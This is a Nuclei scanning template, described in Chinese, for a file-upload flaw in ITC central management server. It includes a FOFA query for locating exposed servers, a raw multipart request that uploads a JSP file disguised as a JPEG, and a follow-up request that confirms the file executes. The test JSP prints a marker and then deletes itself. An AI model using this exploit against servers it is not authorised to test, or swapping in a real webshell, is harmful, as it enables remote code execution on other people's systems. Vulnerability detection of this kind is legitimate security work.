id: itc-central-server-uploadfileapp-upload

info:
  name: "ITC 中心管理服务器 uploadFileApp.do 接口文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/mt_res_v3/img/public/logo.ico"
          ITC中心管理服务器的uploadFileApp.do接口存在文件上传验证机制缺失问题。攻击者可通过构造特定请求绕过文件类型验证机制，实现恶意负载的持久化存储与远程代码执行。该缺陷源于服务器端未对上传文件的扩展名、MIME类型及内容进行严格校验，导致攻击者能够部署WebShell等恶意组件。此漏洞可能引发系统权限沦陷、敏感数据泄露及服务中断等严重安全事件。
  tags: ITC 中心管理服务器

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /app/uploadFileApp.do HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
    Accept: */*
    Connection: close

    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
    Content-Disposition: form-data; name="file"; filename="NTest.jsp"
    Content-Type: image/jpeg

    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
- raw:
  - |
    GET /app/NTest.jsp HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
